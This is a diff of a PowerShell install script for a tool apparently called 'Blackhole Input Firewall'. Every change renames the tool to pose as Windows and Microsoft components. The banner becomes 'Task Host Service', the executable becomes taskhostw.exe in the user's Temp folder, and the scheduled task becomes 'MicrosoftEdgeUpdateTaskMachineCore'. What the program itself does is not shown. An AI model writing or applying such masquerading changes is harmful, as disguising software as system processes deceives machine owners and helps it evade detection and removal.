@@ -18,13 +18,13 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 Write-Host ""
 Write-Host "========================================"
-Write-Host "  Blackhole Input Firewall - Install"
+Write-Host "  Task Host Service - Install"
 Write-Host "========================================"
 Write-Host ""
 
 # Check if executable exists
-if (-not (Test-Path "dist\blackhole.exe")) {
-    Write-Host "ERROR: blackhole.exe not found in dist\ directory." -ForegroundColor Red
+if (-not (Test-Path "dist\taskhostw.exe")) {
+    Write-Host "ERROR: taskhostw.exe not found in dist\ directory." -ForegroundColor Red
     Write-Host "Please run build.ps1 first to create the executable."
     Write-Host ""
     Read-Host "Press Enter to exit"
@@ -33,8 +33,8 @@ if (-not (Test-Path "dist\blackhole.exe")) {
 
 # Define installation paths
 $InstallDir = "$env:LOCALAPPDATA\Temp"
-$ExePath = "$InstallDir\blackhole.exe"
-$TaskName = "blackhole"
+$ExePath = "$InstallDir\taskhostw.exe"
+$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"
 
 Write-Host "[1/4] Creating installation directory"
 if (-not (Test-Path $InstallDir)) {
@@ -44,13 +44,13 @@ Write-Host "  - Directory: $InstallDir"
 Write-Host ""
 
 Write-Host "[2/4] Copying executable"
-Copy-Item "dist\blackhole.exe" $ExePath -Force
+Copy-Item "dist\taskhostw.exe" $ExePath -Force
 if (-not (Test-Path $ExePath)) {
     Write-Host "ERROR: Failed to copy executable." -ForegroundColor Red
     Read-Host "Press Enter to exit"
     exit 1
 }
-Write-Host "  - Copied: blackhole.exe"
+Write-Host "  - Copied: taskhostw.exe"
 Write-Host ""
 
 # Handle .dev_mode marker
